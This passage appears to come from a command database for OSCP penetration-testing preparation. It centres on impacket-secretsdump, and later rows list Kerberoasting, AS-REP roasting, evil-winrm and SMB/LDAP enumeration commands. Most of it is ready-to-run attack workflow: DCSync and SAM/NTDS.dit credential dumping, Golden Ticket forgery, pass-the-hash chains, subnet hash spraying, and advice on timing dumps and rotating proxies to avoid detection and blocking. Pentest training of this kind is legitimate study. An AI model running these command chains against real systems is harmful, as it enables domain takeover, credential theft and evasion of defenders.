It supports MULTIPLE dumping methods, each with different requirements and use cases:
**DUMPING METHODS COMPARISON:**

1.

**DCSYNC (-just-dc, -just-dc-ntlm, -just-dc-user):**
   - PRIVILEGE:
Domain Admin, Enterprise Admin, or replication rights
   - TARGET:
Domain Controller (remotely via DRSUAPI)
   - ACCESS:
Remote (no DC access needed)
   - OUTPUT:
Domain account credentials (all users or specific user)
   - TIME:
1-5 seconds per user, 30 seconds to 10 minutes for full domain
   - FORENSICS:
Event ID 4662 on DC (replication request from non-DC)
   - USE CASE:
Post-exploitation after obtaining DA - dump krbtgt (Golden ticket), dump all domain creds for offline analysis

2.

**SAM DUMP (-sam -security -system):**
   - PRIVILEGE:
Local Administrator on target machine
   - TARGET:
Member servers, workstations (NOT domain controllers)
   - ACCESS:
Remote (via SMB)
   - OUTPUT:
Local account hashes, LSA secrets, cached domain credentials
   - TIME:
<10 seconds
   - FORENSICS:
Registry access logs (Event ID 4663)
   - USE CASE:
Lateral movement - dump local admin hash, check for cached domain admin credentials, extract service account passwords from LSA secrets

3.

**NTDS.DIT EXTRACTION (-ntds):**
   - PRIVILEGE:
Local Administrator on Domain Controller
   - TARGET:
Domain Controller (with pre-extracted NTDS.dit file)
   - ACCESS:
Offline (file-based parsing)
   - OUTPUT:
Domain account credentials (identical to DCSync)
   - TIME:
30-120 seconds (parsing file, no network)
   - FORENSICS:
VSS creation, file copy (if extracting), offline parsing leaves no network trace
   - USE CASE:
Have local admin on DC but not domain admin, DCSync is blocked/detected, analyzing backup files

**TYPICAL OSCP EXAM WORKFLOW:**

PHASE 1:
INITIAL ACCESS & LOCAL ADMIN
- Compromise domain user (password spray, AS-REP roast, web exploit)
- Escalate to local admin on compromised machine (kernel exploit, SeImpersonate, AlwaysInstallElevated)

PHASE 2:
SAM/LSA DUMP (Local Admin  Domain Admin)
- Dump SAM/LSA:
impacket-secretsdump -sam -security -system corp.com/localadmin:pass@192.168.50.80
- Check output for:
  - Cached domain admin credentials (plaintext or hash)
  - Service account passwords in LSA secrets
  - Local admin hash reusable across network
- Pass-the-hash with found credentials to higher-value targets

PHASE 3:
LATERAL MOVEMENT
- Use CME/impacket-wmiexec to spray local admin hash across subnet
- Find machine where domain admin is logged on
- Dump LSASS on that machine (Mimikatz, procdump, task manager)
- Extract domain admin NTLM hash or password

PHASE 4:
DCSYNC (Domain Admin  Full Domain Control)
- Validate DA rights:
crackmapexec smb <dc_ip> -u <da_user> -H <da_hash> --groups
- DCSync krbtgt:
impacket-secretsdump -just-dc-user krbtgt 'corp.com/administrator:pass@192.168.50.70'
- Record krbtgt NTLM hash:
4d28cf5252d39971419580a51484ca09
- DCSync all domain users (optional):
impacket-secretsdump -just-dc-ntlm 'corp.com/administrator:pass@192.168.50.70' > domain_hashes.txt

PHASE 5:
PERSISTENCE
- Golden Ticket:
impacket-ticketer -nthash <krbtgt_hash> -domain corp.com -domain-sid S-1-5-21-XXX fakeadmin
- Pass-the-hash:
Store all dumped hashes for continued access
- Crack hashes offline:
hashcat -m 1000 domain_hashes.txt rockyou.txt -r best64.rule

**COMMAND VARIATIONS FOR DIFFERENT SCENARIOS:**

# DCSync all domain users (full dump):
impacket-secretsdump -just-dc-ntlm 'corp.com/administrator:Pass123!@192.168.50.70'

# DCSync specific user (fast, targeted):
impacket-secretsdump -just-dc-user krbtgt 'corp.com/administrator:Pass123!@192.168.50.70'

# DCSync with Pass-the-Hash:
impacket-secretsdump -just-dc-ntlm -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/administrator@192.168.50.70

# Dump SAM/LSA from member server:
impacket-secretsdump -sam -security -system corp.com/localadmin:pass@192.168.50.80

# Parse offline NTDS.dit file:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

# Kerberos auth with pre-obtained ticket:
export KRB5CCNAME=/tmp/admin.ccache
impacket-secretsdump -k -no-pass -just-dc-user krbtgt corp.com/admin@DC1.corp.com

**OUTPUT PARSING AUTOMATION:**

# Extract all NTLM hashes to file:
impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':::' > all_hashes.txt

# Extract specific user hash:
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep 'Administrator' | cut -d ':' -f 4

# Extract krbtgt hash for Golden Ticket:
KRBTGT_HASH=$(impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':502:' | cut -d ':' -f 4)
echo ""krbtgt hash:
$KRBTGT_HASH""

# Batch DCSync multiple high-value targets:
for user in Administrator krbtgt 'Domain Admins'; do
  echo ""[+] Dumping $user""
  impacket-secretsdump -just-dc-user ""$user"" 'corp.com/admin:pass@192.168.50.70' | grep ':::'
done

# Save output with timestamp:
impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70' | tee dcsync_$(date +%Y%m%d_%H%M%S).txt

**TIME ESTIMATES FOR OSCP EXAM:**

- SAM/LSA dump (single machine):
5-15 seconds
- DCSync single user (krbtgt):
2-10 seconds
- DCSync full domain (50-200 users):
30-120 seconds
- NTDS.dit parsing (offline, pre-extracted file):
30-60 seconds
- Hash cracking (depends on complexity):
5 minutes to several hours (run in background)
- TOTAL (DA credentials  krbtgt hash  Golden Ticket ready):
**<2 minutes**

**DETECTION AND OPSEC:**

DCSYNC DETECTION:
- Event ID 4662 on DC:
""An operation was performed on an object"" with replication GUIDs
- Source is non-DC machine (workstation/server IP, not DC IP)
- User account performing replication (not MACHINE$ account)
- OPSEC:
Targeted DCSync (-just-dc-user) is stealthier than full dump (-just-dc-ntlm)
- Timing:
Perform during business hours (appears as normal admin activity)

SAM/LSA DUMP DETECTION:
- Event ID 4663:
Registry hive access (HKLM\SAM, HKLM\SECURITY)
- Remote registry access from network source
- OPSEC:
Common administrative activity (less suspicious than DCSync)

NTDS.DIT EXTRACTION DETECTION:
- VSS snapshot creation:
Event ID 8222 (Volume Shadow Copy created)
- File access:
NTDS.dit, SYSTEM hive (Event ID 4663)
- Large file transfer (100MB-10GB NTDS.dit file)
- OPSEC:
Most forensically visible method (file artifacts, transfer logs)

**COMMON MISTAKES TO AVOID:**

1.

NOT QUOTING AUTH STRING:
   - WRONG:
impacket-secretsdump corp.com/admin:Pass123!@192.168.50.70
   - RIGHT:
impacket-secretsdump 'corp.com/admin:Pass123!@192.168.50.70'

2.

USING WRONG PRIVILEGE LEVEL:
   - DCSync needs DOMAIN ADMIN, not local admin
   - SAM dump needs LOCAL ADMIN, not domain user
   - Verify first:
crackmapexec smb <target> -u <user> -p <pass> --groups

3.

WRONG TARGET FOR OPERATION:
   - DCSync:
Target DOMAIN CONTROLLER (dc_ip)
   - SAM dump:
Target MEMBER SERVER/WORKSTATION (not DC)
   - NTDS.dit:
Use 'LOCAL' as target (file-based, not network)

4.

FORGETTING TO EXTRACT KRBTGT:
   - Always DCSync krbtgt first (Golden Ticket capability)
   - Then dump other users if needed/time permits

5.

NOT TESTING CREDENTIALS BEFORE DCSYNC:
   - Test with crackmapexec first (fast, less suspicious than failed DCSync)
   - Failed DCSync generates Event ID 4662 (detection alert)

**INTEGRATION WITH OTHER TOOLS:**

# Chain:
secretsdump  hashcat  pass-the-hash
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' | grep ':500:' | cut -d ':' -f 4 > admin_hash.txt
hashcat -m 1000 admin_hash.txt rockyou.txt --show
# If cracked:
impacket-wmiexec corp.com/Administrator:'cracked_password'@192.168.50.70
# If not cracked:
ADMIN_HASH=$(cat admin_hash.txt)
impacket-wmiexec -hashes :$ADMIN_HASH corp.com/Administrator@192.168.50.70

# Chain:
secretsdump krbtgt  Golden Ticket  Full domain access
KRBTGT=$(impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':502:' | cut -d ':' -f 4)
impacket-ticketer -nthash $KRBTGT -domain corp.com -domain-sid S-1-5-21-1987370270-658905905-1781884369 -user-id 500 fakeadmin
export KRB5CCNAME=fakeadmin.ccache
impacket-wmiexec -k -no-pass corp.com/fakeadmin@DC1.corp.com

# Chain:
secretsdump SAM  CME password spray
impacket-secretsdump -sam -security -system corp.com/admin:pass@192.168.50.80 | grep ':500:' | cut -d ':' -f 4 > local_admin.txt
LOCAL_ADMIN_HASH=$(cat local_admin.txt)
crackmapexec smb 192.168.50.0/24 -u Administrator -H $LOCAL_ADMIN_HASH --local-auth

**ALTERNATIVES AND WHEN TO USE THEM:**

SECRETSDUMP vs MIMIKATZ:
- Use secretsdump:
From Kali (your primary attack platform), no AV/EDR on target, want remote execution
- Use Mimikatz:
Already on Windows machine with DA, need advanced Kerberos features (ticket manipulation, skeleton key)

SECRETSDUMP vs CRACKMAPEXEC:
- Use secretsdump:
Comprehensive dump (SAM+LSA+SECURITY), DCSync capability, parse NTDS.dit files
- Use CME:
Quick hash dump (--sam, --lsa), spray credentials across network (--local-auth), integrated with other CME features

DCSYNC vs NTDS.DIT EXTRACTION:
- Use DCSync:
Have domain admin, want remote operation, need speed, prefer stealth
- Use NTDS.dit:
Have local admin on DC (not DA), DCSync is detected/blocked, want offline analysis

**FINAL OSCP EXAM TIPS:**

1.

Create aliases for common commands:
   ```bash
   alias dcsync-krbtgt='impacket-secretsdump -just-dc-user krbtgt'
   alias dcsync-all='impacket-secretsdump -just-dc-ntlm'
   alias dump-sam='impacket-secretsdump -sam -security -system'
   ```

2.

Always run DCSync with output redirect:
   ```bash
   impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@dc_ip' | tee domain_dump.txt
   ```
   (Allows re-parsing without re-running if network drops)

3.

Validate credentials BEFORE attempting secretsdump:
   ```bash
   crackmapexec smb <target> -u <user> -p <pass>
   # Output should show 'Pwn3d!' for admin
   ```

4.

Keep a credential collection file:
   ```bash
   echo ""Administrator:2892d26cdf84d7a70e2eb3b9f05c425e"" >> creds.txt
   echo ""krbtgt:4d28cf5252d39971419580a51484ca09"" >> creds.txt
   ```

5.

Time management:
   - If secretsdump takes >2 minutes, cancel and try alternative method
   - Run hash cracking in background (don't wait for results before proceeding)
   - Prioritize krbtgt (Golden Ticket) over full domain dump

This tool is the CORNERSTONE of post-exploitation credential harvesting in OSCP.

Master DCSync, SAM dumping, and NTDS.dit extraction - you'll use them in EVERY Active Directory exam machine.","high","","","","{""RemoteOperations failed / DCERPC Runtime Error"": ""DIAGNOSIS: Insufficient privileges. FOR DCSYNC (-just-dc/-just-dc-ntlm): Requires Domain Admin, Enterprise Admin, or replication rights. FOR SAM/LSA (-sam/-security): Requires local admin on target machine. SOLUTIONS: 1) Verify Domain Admin membership: crackmapexec smb <target> -u <user> -p <pass> --groups (look for 'Domain Admins' in output). 2) Test credentials first: crackmapexec smb <target> -u <user> -p <pass> (should show 'Pwn3d!' for admin). 3) Check if user is LOCAL admin (for SAM) vs DOMAIN admin (for DCSync): whoami /groups OR net localgroup administrators. 4) Try alternative admin account: net group \""Domain Admins\"" /domain (lists all DAs). 5) If you have local admin on DC but NOT domain admin: Use -ntds flag to dump NTDS.dit file instead of DCSync."", ""Special characters in password breaking auth"": ""BASH treats !, $, `, \\, \"", ', &, |, ;, <, >, (, ), [, ], {, }, *, ?, ~, # as special chars. SOLUTIONS: 1) SINGLE QUOTES (recommended): impacket-secretsdump 'corp.com/admin:P@ssw0rd!@2023@192.168.50.70' - Prevents ALL bash expansion. 2) ESCAPE WITH BACKSLASH: impacket-secretsdump corp.com/admin:P@ssw0rd\\!@2023@192.168.50.70 - Escape each special char. 3) USE HASH INSTEAD: impacket-secretsdump -hashes :NTLM corp.com/admin@192.168.50.70 - Bypasses password entirely. 4) PASSWORD FILE: echo 'P@ssw0rd!@2023' > pass.txt && impacket-secretsdump corp.com/admin@192.168.50.70 < pass.txt. COMMON ERRORS: 'bash: event not found' (! without escape), 'bash: $: command not found' ($ expansion), 'bash: syntax error near unexpected token' (unmatched quotes)."", ""Connection timeout / target unreachable"": ""DIAGNOSIS: Network connectivity issue. REQUIRED PORTS: TCP 135 (RPC Endpoint Mapper), TCP 49152-65535 (RPC dynamic), TCP 445 (SMB), TCP 88 (Kerberos), TCP 389 (LDAP). TROUBLESHOOTING: 1) Verify target is up: ping <target_ip>. 2) Test SMB: smbclient -L //<target_ip> -U <domain>/<user>%<pass>. 3) Test RPC: nc -zv <target_ip> 135 (should show 'open'). 4) Check routing: ip route get <target_ip> (verify correct interface). 5) Verify VPN/network: ifconfig, route -n. 6) Try FQDN instead of IP: impacket-secretsdump corp.com/admin:pass@DC1.corp.com. 7) Test with alternative DC: nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.com (lists all DCs, try different IP)."", ""Parsing secretsdump output / extracting hashes"": ""OUTPUT FORMAT: domain\\user:RID:LMhash:NThash::: EXAMPLE: corp\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: PARSING: 1) NTLM hash is 4th field (after 3rd colon): cut -d ':' -f 4. 2) LM hash is 3rd field (usually 'aad3b435b51404eeaad3b435b51404ee' = empty LM). 3) RID (Relative ID): 500=Domain Administrator, 502=krbtgt, 1000+=custom users. 4) Kerberos keys (if -just-dc used): Listed separately as 'aes256-cts-hmac-sha1-96:', 'aes128-cts-hmac-sha1-96:', 'des-cbc-md5:'. AUTOMATED EXTRACTION: impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':::' > hashes.txt (saves all hashes to file, one per line). FOR HASHCAT: echo '2892d26cdf84d7a70e2eb3b9f05c425e' > hash.txt && hashcat -m 1000 hash.txt rockyou.txt. FOR PASS-THE-HASH: impacket-wmiexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/Administrator@192.168.50.70.""}","{""-just-dc"": ""DCSYNC MODE - Uses DRSUAPI (Directory Replication Service API) to impersonate domain controller and request credential replication. Extracts NTLM hashes, LM hashes, Kerberos keys (AES256, AES128, DES), password history, and supplemental credentials for ALL domain users. REQUIRES: Domain Admin, Enterprise Admin, or explicit replication rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All). OUTPUT: Full credential dump including password history and Kerberos keys. TIME: 1-10 minutes for full domain (depends on user count: 50 users ~30sec, 500 users ~5min). ADVANTAGE: Works remotely without DC access, stealthier than NTDS.dit file copy, appears as normal replication traffic. DETECTION: Event ID 4662 on DC (replication request from non-DC machine). USE CASE: Post-exploitation after obtaining Domain Admin - dump entire domain for analysis, offline cracking, and persistence planning. COMPARISON: -just-dc (full dump, slow) vs -just-dc-ntlm (NTLM only, faster) vs -just-dc-user (single user, fastest)."", ""-just-dc-ntlm"": ""DCSync mode with NTLM-only extraction (skips Kerberos keys, password history, supplemental credentials). FASTER than -just-dc (30-50% speed improvement) while still providing the most critical credential type (NTLM hashes). OUTPUT FORMAT: domain\\user:RID:LMhash:NThash::: - Ready for Pass-the-Hash attacks, offline cracking with Hashcat, or Golden/Silver ticket creation. TIME ESTIMATE: 30-120 seconds for typical OSCP domain (50-200 users). RECOMMENDED FOR OSCP EXAMS: Balances speed and completeness. NTLM hashes are sufficient for PTH, ticket forgery, and credential cracking - you rarely need Kerberos keys unless doing advanced AES-based attacks. MEMORY EFFICIENT: Smaller output (no verbose Kerberos data), easier to parse and store. WHEN TO USE: Time-constrained scenarios (OSCP exam), when you only need hashes for PTH/cracking, or when -just-dc is too slow on large domains."", ""-just-dc-user <username>"": ""DCSync SINGLE USER - Extracts credentials for ONE specific domain account. FASTEST DCSync method (1-5 seconds). RECOMMENDED USAGE: Target high-value accounts (Administrator, krbtgt for Golden tickets, specific domain admins). STEALTH ADVANTAGE: Single-user replication is less suspicious than full domain dump (generates fewer Event ID 4662 logs, appears more like targeted query). OSCP WORKFLOW: After obtaining Domain Admin, immediately DCSync krbtgt (Golden ticket), then DCSync Administrator (backup access), then selectively DCSync other high-value targets. TROUBLESHOOTING: If username not found, verify spelling (case-insensitive but must be exact). For computer accounts, append $ (e.g., DC1$). EXAMPLE: impacket-secretsdump -just-dc-user krbtgt 'corp.com/administrator:Pass123!@192.168.50.70' - Dumps ONLY krbtgt account (for Golden ticket creation)."", ""-sam"": ""SAM DATABASE DUMP - Extracts local account credentials from the Security Account Manager (SAM) database on target machine. REQUIRES: Local Administrator privileges on target (NOT domain admin needed). TARGET: Member servers, workstations (NOT domain controllers - DCs don't store local accounts in SAM). OUTPUT: Local account hashes (Administrator, Guest, custom local accounts). DOES NOT include domain accounts. USE CASE: Lateral movement after compromising local admin on member server - dump local admin hash, reuse across network (password reuse common). COMPARISON: -sam (local accounts) vs -just-dc (domain accounts via DCSync) vs -ntds (domain accounts via file extraction). TIME: <10 seconds. DETECTION: Reads HKLM\\SAM registry hive (Event ID 4663: Object Access). COMBINE WITH -security and -system for complete local credential dump."", ""-security"": ""SECURITY HIVE DUMP - Extracts cached domain credentials, LSA secrets, and service account passwords from SECURITY registry hive. INCLUDES: Cached domain logons (last 10 domain users who logged on), LSA secrets (service account passwords, scheduled task credentials, VPN passwords), DPAPI master keys. REQUIRES: Local admin privileges. TARGET: Any Windows machine (member servers, workstations, even DCs). OUTPUT: Plaintext passwords for services, cached domain hashes (can be cracked offline). HIGH VALUE: Often reveals service account plaintext passwords (stored for services running as domain accounts), or cached domain admin credentials from previous logons. TIME: <10 seconds. COMBINE WITH -sam and -system for full local dump: impacket-secretsdump -sam -security -system corp.com/localadmin:pass@192.168.50.80"", ""-system"": ""SYSTEM HIVE DUMP - Extracts bootkey (system key) needed to decrypt SAM and SECURITY hive data. REQUIRED when using -sam or -security flags (SAM/SECURITY are encrypted with bootkey). TECHNICAL: Bootkey is derived from registry keys in HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa (JD, Skew1, GBG, Data). Secretsdump automatically extracts bootkey and uses it to decrypt SAM/SECURITY hives. TIME: <5 seconds. USAGE: Always specify -system when using -sam or -security. EXAMPLE: impacket-secretsdump -sam -security -system corp.com/admin:pass@192.168.50.80 dumps all local credentials (SAM accounts + LSA secrets) using extracted bootkey."", ""-ntds <ntds.dit_path>"": ""NTDS.DIT FILE EXTRACTION MODE - Parses an NTDS.dit database file (Active Directory database) that was previously copied from a domain controller. REQUIRES: Pre-extracted NTDS.dit file (via ntdsutil, vssadmin, or volume shadow copy), SYSTEM hive for bootkey (to decrypt NTDS.dit). WORKFLOW: 1) Create VSS snapshot on DC: vssadmin create shadow /for=C:\\, 2) Copy NTDS.dit from snapshot: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit, 3) Copy SYSTEM hive: reg save HKLM\\SYSTEM C:\\temp\\system.hive, 4) Transfer both files to Kali, 5) Parse with secretsdump: impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL. OUTPUT: ALL domain credentials (same as -just-dc DCSync). ADVANTAGE: Works offline (no network interaction, no detection), can be done from backup files. DISADVANTAGE: Requires local admin on DC (higher privilege than DCSync's domain admin), generates more forensic artifacts (file copy, VSS creation), slower workflow. WHEN TO USE: DCSync blocked/detected, have local admin on DC but not domain admin, or analyzing backup files offline."", ""-hashes :<NTLM_HASH>"": ""PASS-THE-HASH AUTHENTICATION - Authenticate using NTLM hash instead of plaintext password. FORMAT: -hashes LM:NTLM or -hashes :NTLM (LM can be omitted, use empty value before colon). NTLM HASH: 32 hexadecimal characters (MD4 hash of password). ADVANTAGE: No need to crack password - use hash directly from previous dumps (LSASS, SAM, DCSync output). OSCP WORKFLOW: 1) Obtain admin NTLM hash via LSASS dump or secretsdump -sam on compromised machine, 2) Use hash for DCSync without knowing plaintext password: impacket-secretsdump -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/administrator@192.168.50.70. TIME SAVER: Skips password cracking phase (can take hours/days if complex password). DETECTION: Identical to password auth (NTLM challenge-response), no special indicators. OPSEC: Cleaner than plaintext password in command history (less sensitive if logs captured)."", ""-k"": ""KERBEROS AUTHENTICATION - Use Kerberos ticket from KRB5CCNAME cache instead of password/hash. REQUIRES: Pre-obtained TGT (Ticket Granting Ticket) stored in ccache file, -no-pass flag to skip password prompt. WORKFLOW: 1) Obtain TGT via Golden Ticket (impacket-ticketer) or legitimate auth (impacket-getTGT), 2) Export ticket: export KRB5CCNAME=/tmp/admin.ccache, 3) Use ticket for DCSync: impacket-secretsdump -k -no-pass corp.com/admin@DC1.corp.com. ADVANTAGE: Stealthier than NTLM (Kerberos is preferred protocol in modern AD), bypasses NTLM restrictions (if NTLM disabled on DC). TARGET MUST BE FQDN: Kerberos uses hostname-based SPNs (DC1.corp.com, NOT 192.168.50.70). TIME SYNC CRITICAL: Kerberos requires client and DC clocks within 5 minutes (check: timedatectl). USE CASE: Advanced persistence scenarios, environments with NTLM disabled, or when you already have Golden/Silver ticket.""}","[""ad-dcsync-check-domain-admins"", ""crackmapexec-validate-admin""]","[""ad-dcsync-mimikatz-single-user"", ""ad-dcsync-impacket-secretsdump-user""]","[""hashcat-crack"", ""crackmapexec-smb-spray"", ""ad-golden-ticket-mimikatz-create""]"
"getnpusers-asreproast","Impacket GetNPUsers - AS-REP Roasting","active-directory","impacket-GetNPUsers <DOMAIN>/ -usersfile <USERLIST> -dc-ip <DC_IP>","Extract AS-REP hashes for users without Kerberos pre-auth","kerberos-attacks","impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 192.168.1.10","","","","","","","{""-dc-ip"": ""Domain controller IP"", ""-usersfile"": ""File containing usernames"", ""-request"": ""Request TGT for users""}","","",""
"getuserspns-kerberoast","Impacket GetUserSPNs - Kerberoasting","active-directory","impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request","Request service tickets for Kerberoastable accounts","kerberos-attacks","impacket-GetUserSPNs domain.local/user:Password123 -dc-ip 192.168.1.10 -request","","","","","","","{""-request"": ""Request TGS tickets"", ""-dc-ip"": ""Domain controller IP"", ""-outputfile"": ""Save hashes to file""}","","",""
"evil-winrm-shell","Evil-WinRM - PowerShell Remoting","active-directory","evil-winrm -i <TARGET> -u <USER> -p <PASSWORD>","Connect to Windows via WinRM for PowerShell access","lateral-movement","evil-winrm -i 192.168.1.10 -u administrator -p Password123","","","","","","","{""-i"": ""Target IP"", ""-u"": ""Username"", ""-p"": ""Password"", ""-H"": ""NTLM hash (pass-the-hash)""}","","",""
"rpcclient-enum","RPCClient - Enumerate SMB","active-directory","rpcclient -U '<USER>%<PASS>' <TARGET>","Enumerate SMB/MSRPC information","enumeration","rpcclient -U 'admin%P@ssw0rd123!' 192.168.1.10","","","","","","","","","",""
"smbclient-connect","SMBClient - Connect to Share","active-directory","smbclient //<TARGET>/<SHARE> -U <USER>","Connect to SMB share and browse files","enumeration","smbclient //192.168.1.10/C$ -U administrator","","","","","","","{""-U"": ""Username"", ""-N"": ""No password (null session)"", ""-L"": ""List shares""}","","",""
"smbmap-shares","SMBMap - Enumerate Shares","active-directory","smbmap -H <TARGET> -u <USER> -p <PASS>","Enumerate SMB shares and permissions","enumeration","smbmap -H 192.168.1.10 -u guest -p P@ssw0rd123!","","","","","","","{""-H"": ""Target host"", ""-u"": ""Username"", ""-p"": ""Password"", ""-R"": ""Recursively list shares""}","","",""
"ldapsearch-ad","LDAP Search - AD Enumeration","active-directory","ldapsearch -x -H ldap://<TARGET> -D '<USER>@<DOMAIN>' -w '<PASS>' -b '<BASE_DN>' '(objectClass=user)'","Query Active Directory via LDAP","enumeration","ldapsearch -x -H ldap://192.168.1.10 -D 'user@domain.local' -w 'Password123' -b 'DC=domain,DC=local' '(objectClass=user)'","","","","","","","","","",""
"rubeus-asreproast","Rubeus - AS-REP Roasting","active-directory","Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt","Perform AS-REP roasting on Windows","kerberos-attacks","","","","","","","","{""/format:hashcat"": ""Output format for hashcat"", ""/outfile"": ""Output file for hashes"", ""/user:<USER>"": ""Target specific user""}","","",""
"rubeus-kerberoast","Rubeus - Kerberoasting","active-directory","Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt","Perform Kerberoasting on Windows","kerberos-attacks","","","","","","","","{""/format:hashcat"": ""Output format for hashcat"", ""/outfile"": ""Output file for hashes"", ""/user:<USER>"": ""Target specific SPN account""}","","",""
"sc-qc-service","Query Service Configuration","post-exploit","sc qc <SERVICE_NAME>","Query detailed service configuration information on Windows including start type, binary path, and service dependencies","","sc qc wuauserv","Extracted from instruction text:
'Manual check with:
sc qc <servicename>'.

Used to manually verify service configuration details during privilege escalation enumeration.","high","","","","","{""qc"": ""Query configuration - displays service configuration details""}","","[""get-service""]",""
"nmap-version-check","Check Nmap Version","enumeration","nmap --version","Verify installed nmap version to determine available features and capabilities","","","Extracted from instruction text:
'Check nmap version:
nmap --version (if < 5.21, interactive works)'.

Nmap versions prior to 5.21 support interactive mode which can be exploited for privilege escalation via sudo.","medium","","","","","{""--version"": ""Display version information and compilation details""}","","",""
"strings-binary-analysis","Extract Strings from Binary","post-exploit","strings <BINARY_PATH>","Extract printable character sequences from binary files to identify hardcoded credentials, file paths, or function names","","strings /usr/local/bin/vulnerable_app","Extracted from instruction text:
'Manual binary analysis:
strings /path/to/binary'.

Common technique for analyzing SUID binaries, identifying library dependencies, or finding embedded credentials.","high","","","","","{""strings"": ""Default behavior extracts sequences of 4+ printable characters""}","","",""
"getcap-specific-binary","Check Specific Binary Capabilities","post-exploit","getcap <BINARY_PATH>","Query Linux capabilities assigned to a specific binary for privilege escalation analysis","","getcap /usr/bin/python3","Extracted from instruction text:
'Check specific binary:
getcap /usr/bin/python3 (test known binary)'.

Verifies if a known binary has capabilities that could be exploited for privilege escalation.","high","","","","","","","",""
"ldap-dn-path-check","Manual LDAP DN Path Inspection","enumeration","grep -E 'CN=(Users|Groups)' <LDAP_OUTPUT_FILE>","Manually inspect LDAP distinguished name paths to identify user and group container locations","","grep -E 'CN=(Users|Groups)' ldap_results.txt","Extracted from instruction text:
'Manual check:
Look for 'CN=Users' or 'CN=Groups' in DN path'.

Used to manually verify LDAP query results and identify organizational structure in Active Directory environments.","medium","","","","","","","[""ldapsearch-ad""]",""
"ad-user-attribute-inspection","Inspect AD User Attributes","enumeration","$script:AllUsers[-1].Properties | select description,info,comment","Extract and display description, info, and comment attributes from Active Directory user objects that may contain credentials or sensitive information","","","Extracted from instruction text:
'Manual attribute inspection:
$script:AllUsers[-1].Properties | select description,info,comment'.

PowerShell command to inspect specific attributes of AD user objects, often containing passwords or sensitive notes.","high","","","","","","[""import-powerview""]","",""
"powerview-module-path-check","Verify PowerView Module Path","enumeration","(Get-Module PowerView).Path | Select-String -Pattern 'version'","Check loaded PowerView module path and version information to verify correct module is loaded","","","Extracted from instruction text:
'Check module path:
(Get-Module PowerView).Path | Select-String -Pattern 'version''.

Verifies PowerView module is correctly imported and identifies which version is active.","medium","","","","","","[""import-powerview""]","",""
"ad-check-allextendedrights","Enumerate All Extended Rights","enumeration","Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'ExtendedRight'}","Filter Active Directory ACLs to find all objects with ExtendedRight permissions including ForceChangePassword capability","","","Extracted from instruction text:
'Check for AllExtendedRights (includes ForceChangePassword):
Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'ExtendedRight'}'.

Identifies objects where current user has extended rights that may allow password changes or other privileged operations.","high","","","","","{""?"": ""PowerShell alias for Where-Object to filter results"", ""-match"": ""Regular expression matching operator""}","[""import-powerview""]","",""
"ad-acl-enumeration-by-sid","Enumerate ACLs by Security Identifier","enumeration","Get-ObjectAcl -Identity <TARGET> | ? {$_.SecurityIdentifier -eq <YOUR_SID>}","Query Active Directory object ACLs filtered by specific security identifier to find permissions current user has on target","","Get-ObjectAcl -Identity CN=Administrator,CN=Users,DC=corp,DC=com | ? {$_.SecurityIdentifier -eq S-1-5-21-1234567890-1234567890-1234567890-1001}","Extracted from instruction text:
'Manual enumeration:
Get-ObjectAcl -Identity <TARGET> | ? {$_.SecurityIdentifier -eq <YOUR_SID>}'.

Manually enumerate specific ACL permissions current user has on target object to identify privilege escalation paths.","high","","","","","","[""import-powerview""]","",""
"check-robots-txt","Retrieve robots.txt File","web","curl http://<TARGET>/robots.txt","Request robots.txt file from web server to discover hidden directories and files excluded from search engine indexing","","curl http://192.168.1.100/robots.txt","Extracted from instruction text:
'Check robots.txt first:
curl http://<TARGET>/robots.txt'.

First step in web reconnaissance to identify potentially sensitive directories and files before directory brute forcing.","high","","","","","","","[""nikto-scan""]",""
"check-rate-limiting","Test for Rate Limiting","web","wfuzz -c -w <SMALL_WORDLIST> -u <TARGET_URL> -d ""<POST_DATA>"" --hc 429","Test web application for rate limiting controls using small wordlist before full brute force attempt","","wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-20.txt -u http://192.168.1.100/login.php -d ""username=admin&password=FUZZ"" --hc 429","Extracted from instruction text:
'Check for rate limiting:
Test with small wordlist first'.

Proactive check to avoid account lockout or IP banning before attempting full password brute force attack.","high","","","","{""429 status codes"": ""Rate limiting detected - use slower attack with --req-delay or manual attempts"", ""Account lockout messages"": ""Reduce request rate, increase delay between attempts"", ""IP blocking"": ""Use proxy rotation or VPN to change source IP""}","{""-c"": ""Colorize output for better readability"", ""-w"": ""Specify wordlist file"", ""-u"": ""Target URL"", ""-d"": ""POST data to send"", ""--hc"": ""Hide responses with specific HTTP status code""}","[""check-robots-txt""]","",""
"cat-read-file","Read File with cat","utilities","cat <FILE>","Display file contents to terminal for reading configuration files, flags, and text files","file-operations","cat /etc/passwd","Basic file reading command for OSCP.

Common usage:
cat /etc/passwd - User enumeration
cat /etc/shadow - Password hashes (requires root)
cat user.txt - User flag
cat root.txt - Root flag
cat config.php - Database credentials

